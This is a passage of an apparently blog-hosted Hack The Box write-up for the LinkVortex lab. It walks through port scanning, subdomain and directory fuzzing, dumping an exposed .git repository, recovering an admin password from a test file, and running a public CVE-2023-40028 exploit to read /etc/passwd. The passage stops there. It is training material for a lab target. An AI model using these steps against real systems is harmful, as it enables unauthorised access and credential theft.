&lt;/h2>&lt;p>User: Exposed .git repository &amp;amp; CVE-2023-40028&lt;br>
Root: Nested symlinks or TOCTOU race condition exploit&lt;/p>
&lt;h2 id="enumeration">Enumeration
&lt;/h2>&lt;p>Starting with a simple nmap scan, we can identify that ssh and a web server are running.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nmap&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">Pn&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="o">-&lt;/span> &lt;span class="mf">10.10.11.47&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">PORT&lt;/span> &lt;span class="nx">STATE&lt;/span> &lt;span class="nx">SERVICE&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">22&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ssh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">80&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">http&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;h2 id="user">User
&lt;/h2>&lt;h3 id="fuzzing">Fuzzing
&lt;/h3>&lt;p>We discover &amp;ldquo;&amp;ldquo;BitByBit Hardware&amp;rdquo; website running on port 80 powered by Ghost CMS.
&lt;img src="https://01MI.github.io/p/linkvortex-htb-writeup-linux-easy/Bitbybit.PNG"
width="500"
height="604"
srcset="https://01MI.github.io/p/linkvortex-htb-writeup-linux-easy/Bitbybit_hu_2bf7c728a818b446.PNG 480w, https://01MI.github.io/p/linkvortex-htb-writeup-linux-easy/Bitbybit_hu_9137c64ab260ec10.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="82"
data-flex-basis="198px"
>&lt;/p>
&lt;p>After adding it to our &lt;code>hosts&lt;/code> file, we fuzz it and uncover a subdomain: &lt;code>dev.linkvortex.htb&lt;/code>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ffuf&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">seclists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Discovery&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">DNS&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">subdomains&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">top1million&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">20000.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//linkvortex.htb -H &amp;#34;host: FUZZ.linkvortex.htb&amp;#34; -fs 230&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">dev&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Status&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2538&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Words&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">670&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Lines&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">116&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Duration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">15&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">]&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;img src="https://01MI.github.io/p/linkvortex-htb-writeup-linux-easy/devLinkVortex.PNG"
width="515"
height="300"
srcset="https://01MI.github.io/p/linkvortex-htb-writeup-linux-easy/devLinkVortex_hu_b050a244cd8be536.PNG 480w, https://01MI.github.io/p/linkvortex-htb-writeup-linux-easy/devLinkVortex_hu_3e9f046e43f5e6d2.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="171"
data-flex-basis="412px"
>&lt;/p>
&lt;p>Fuzzing this subdomain reveals the presence of a &lt;code>.git&lt;/code> directory.&lt;br>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ffuf&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">seclists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Discovery&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Web&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Content&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">common&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//dev.linkvortex.htb/FUZZ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>&lt;span class="nx">git&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Status&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">301&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">239&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Words&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">14&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Lines&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Duration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">15&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>&lt;span class="nx">git&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">HEAD&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Status&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">41&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Words&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Lines&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Duration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">18&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>&lt;span class="nx">git&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">logs&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Status&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">868&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Words&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">59&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Lines&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Duration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">19&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>&lt;span class="nx">git&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">config&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Status&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">201&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Words&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">14&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Lines&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">9&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Duration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">17&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>&lt;span class="nx">git&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">index&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Status&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">707577&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Words&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2171&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Lines&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2172&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Duration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">17&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">html&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Status&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2538&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Words&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">670&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Lines&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">116&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Duration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">server&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">status&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Status&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">403&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Size&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">199&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Words&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">14&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Lines&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">Duration&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">19&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">]&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;p>We can then use the tool &lt;a class="link" href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener"
>GitHack&lt;/a> to recover the original source code.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">GitHack&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//dev.linkvortex.htb/.git/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">tree&lt;/span> &lt;span class="nx">dev&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">dev&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="nx">Dockerfile&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ghost&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="nx">ghost&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="nx">core&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="nx">test&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="nx">regression&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="nx">api&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="nx">admin&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="nx">authentication&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">test&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">js&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">7&lt;/span> &lt;span class="nx">directories&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="nx">files&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>Among the recovered files, we find &lt;code>authentication.test.js&lt;/code>, which contains the admin credentials:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 5
&lt;/span>&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">less&lt;/span> &lt;span class="nx">ghost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">core&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">test&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">regression&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">api&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">admin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">authentication&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">test&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">js&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">it&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">complete&lt;/span> &lt;span class="nx">setup&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">async&lt;/span> &lt;span class="nf">function&lt;/span> &lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">const&lt;/span> &lt;span class="nx">email&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">test&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">example&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">com&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="kd">const&lt;/span> &lt;span class="nx">password&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">OctopiFociPilfer45&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">const&lt;/span> &lt;span class="nx">requestMock&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nf">nock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//api.github.com&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nf">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">repos&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tryghost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">dawn&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">zipball&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nf">query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nf">replyWithFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">fixtureManager&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">getPathForFixture&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">themes&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">valid&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">zip&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>We can then use this password to access the administration interface(username can be easily guessed as &lt;em>&lt;a class="link" href="mailto:admin@linkvortex.htb" >admin@linkvortex.htb&lt;/a>&lt;/em>) using &lt;a class="link" href="http://linkvortex.htb/ghost/#/signin" target="_blank" rel="noopener"
>http://linkvortex.htb/ghost/#/signin&lt;/a> but it doesn&amp;rsquo;t give us further access.&lt;/p>
&lt;p>However, in &lt;code>Dockerfile.ghost&lt;/code>, we find the Ghost version: 5.58.0, which is vulnerable to &lt;a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-40028" target="_blank" rel="noopener"
>CVE-2023-40028&lt;/a>, an arbitrary file read vulnerability.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">Dockerfile&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ghost&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">FROM&lt;/span> &lt;span class="nx">ghost&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mf">5.58.0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;p>Using this &lt;a class="link" href="https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028" target="_blank" rel="noopener"
>exploit&lt;/a>, we can try it to read the &lt;code>/etc/passwd&lt;/code> file.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">CVE&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2023&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">40028&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">admin&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">OctopiFociPilfer45&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">h&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//linkvortex.htb&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">WELCOME&lt;/span> &lt;span class="nx">TO&lt;/span> &lt;span class="nx">THE&lt;/span> &lt;span class="nx">CVE&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2023&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">40028&lt;/span> &lt;span class="nx">SHELL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Enter&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">file&lt;/span> &lt;span class="nx">path&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nf">read&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">or&lt;/span> &lt;span class="kd">type&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">exit&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">quit&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">etc&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">passwd&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">File&lt;/span> &lt;span class="nx">content&lt;/span>&lt;span class="p">:&lt;/span>
